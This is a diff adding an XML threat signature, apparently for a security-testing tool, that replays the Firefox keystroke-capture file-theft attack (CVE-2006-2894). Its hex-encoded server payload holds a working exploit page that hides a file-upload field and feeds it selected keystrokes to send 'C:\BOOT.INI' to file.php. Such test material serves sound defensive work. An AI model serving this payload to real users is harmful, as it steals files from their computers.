@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Firefox Keystroke Capturing"/>
+    <EngDesc display="true" value="This threat sends a malicious webpage from the virtual server.  It allows the attacker to collect user keystrokes and filter out a specific string to be used to steal files off of a harddisk.  Webservers typically listen on port 80."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mozilla_Firefox"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Mozilla_Firefox_1.5.0.4"/>
+      <item value="Mozilla_Firefox_1.0.8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://lists.grok.org.uk/pipermail/full-disclosure/2006-June/046610.html"/>
+    <CVEID display="true" value="CVE-2006-2894"/>
+    <bugtraqID display="true" value="18308"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="0000010bacad46da00c000a80001003c2190967a" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.7"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="local"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632851901146663750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1149653305" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203036204A756E20323030362031353A31373A343420474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A205475652C203036204A756E20323030362031353A31373A313320474D540D0A455461673A202237303665382D3464342D6265643535303430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A20313233360D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D5554462D380D0A0D0A3C48544D4C3E0A3C484541443E0A3C7374796C6520747970653D22746578742F637373223E0A2E6669727374207B0A7D0A2E7365636F6E64207B0A2020202020202020636F6C6F723A2077686974653B0A20202020202020206261636B67726F756E642D636F6C6F723A2077686974653B0A20202020202020206F7061636974793A20303B0A7D0A3C2F7374796C653E0A3C5343524950543E0A2F2F646F63756D656E742E6F6E4B6579446F776E203D20646F4B657950726573733B0A0A2F2F646F63756D656E742E6F6E4B65795570203D20646F4B657955703B0A7661722073617665643B0A7661722065203B0A766172206D79737472696E67203D2022433A5C5C424F4F542E494E49223B0A2F2F76617220693D6D79737472696E672E6C656E6774682D313B0A76617220693D303B0A66756E6374696F6E20646F4B6579507265737328636875636B7929200A202020207B200A202020207361766564203D20636875636B792E77686963683B0A202020202F2F616C6572742827707265737365642027202B20537472696E672E66726F6D43686172436F646528736176656429202B20272827202B207361766564202B20272927293B0A20202020696620286D79737472696E675B695D20213D20537472696E672E66726F6D43686172436F6465287361766564292E746F5570706572436173652829207C7C0A202020202020202069203E206D79737472696E672E6C656E6774682D3129207B0A2020202020202072657475726E2066616C73653B0A202020207D200A20202020692B2B3B0A2020202072657475726E20747275653B0A20207D3B0A66756E6374696F6E20646F4B65795570202829207B0A0A646F63756D656E742E666F726D735B305D2E7478742E76616C7565202B3D20537472696E672E66726F6D43686172436F6465287361766564293B0A646F63756D656E742E666F726D735B305D2E7478742E666F63757328293B200A0A7D0A0A3C2F5343524950543E0A3C2F484541443E0A3C424F4459203E0A3C464F524D204D4554484F443D504F535420616374696F6E3D66696C652E7068703E0A3C494E5055542069643D276173646627206E616D653D2266696C6575706C6F6164222064656661756C7456616C75653D2761736466617364662720545950453D46494C450A4F6E4B657955703D22646F4B6579557028293B22200A4F6E4B657950726573733D2272657475726E20646F4B65795072657373286576656E74293B223E0A3C696E707574206E616D653D7478742069643D277478742720747970653D746578742076616C75653D27270A4F6E4B6579446F776E3D22646F63756D656E742E666F726D735B305D2E66696C6575706C6F61642E666F63757328293B220A6F6E436C69636B3D22223E200A3C696E70757420747970653D627574746F6E2076616C75653D22696E76697369626C6522206F6E636C69636B3D22646F63756D656E742E666F726D735B305D2E66696C6575706C6F61642E636C6173734E616D653D277365636F6E64273B223E0A3C696E70757420747970653D627574746F6E2076616C75653D2276697369626C65222020206F6E636C69636B3D22646F63756D656E742E666F726D735B305D2E66696C6575706C6F61642E636C6173734E616D653D276669727374273B223E0A0A3C2F464F524D3E0A3C2F424F44593E0A3C2F48544D4C3E0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
